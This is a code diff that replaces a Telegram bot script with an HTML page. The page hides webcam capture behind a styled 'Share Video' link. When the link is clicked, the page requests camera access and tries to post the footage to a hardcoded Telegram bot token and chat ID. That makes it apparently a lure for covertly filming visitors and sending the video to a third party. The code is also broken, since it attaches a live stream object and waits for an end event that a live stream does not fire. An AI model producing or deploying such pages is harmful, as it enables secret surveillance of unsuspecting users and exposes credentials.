@@ -1,24 +1,51 @@
-const { Telegraf } = require('telegraf');
-const { Stream } = require('stream');
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send Video</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <script>
+    function sendVideo() {
+      // درخواست دسترسی به دوربین کاربر
+      navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        // با استفاده از دوربین، یک ویدیو ضبط کنید
+        var videoElement = document.createElement('video');
+        document.body.appendChild(videoElement);
+        videoElement.srcObject = stream;
+        videoElement.play();
 
-const bot = new Telegraf('YOUR_BOT_TOKEN');
+        // زمانی که ویدیو ضبط شده است، ارسال آن را آغاز کنید
+        videoElement.onended = function() {
+          var botToken = '6751743920:AAFKRHdaYL5ozxqC3xOHq8tX7CIW7_rS7mk';
+          var chatId = '1171970672';
+          var url = 'https://api.telegram.org/bot' + botToken + '/sendVideo';
 
-// Command to start streaming
-bot.command('startstream', async (ctx) => {
-  // Check if the message contains a video chat ID
-  if (ctx.message && ctx.message.video_chat_id) {
-    // Get the video chat ID
-    const videoChatId = ctx.message.video_chat_id;
+          // ارسال ویدیو به تلگرام
+          var formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('video', videoElement.srcObject);
 
-    // Start streaming video and audio to the video chat ID
-    const stream = new Stream.PassThrough();
-    // Capture video and audio here (e.g., from camera and microphone)
-
-    // Send the stream to the video chat ID
-    ctx.telegram.sendVideo(videoChatId, stream);
-  } else {
-    ctx.reply('Please provide a video chat ID to start streaming.');
-  }
-});
-
-bot.launch();
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', url, true);
+          xhr.send(formData);
+        };
+      })
+      .catch(function(error) {
+        console.log('دریافت دوربین ناموفق بود: ', error);
+      });
+    }
+  </script>
+  <div class="login-box">
+    <form>
+      <a href="#" onclick="sendVideo()">Share Video
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </a>
+    </form>
+  </div>
+</body>
+</html>
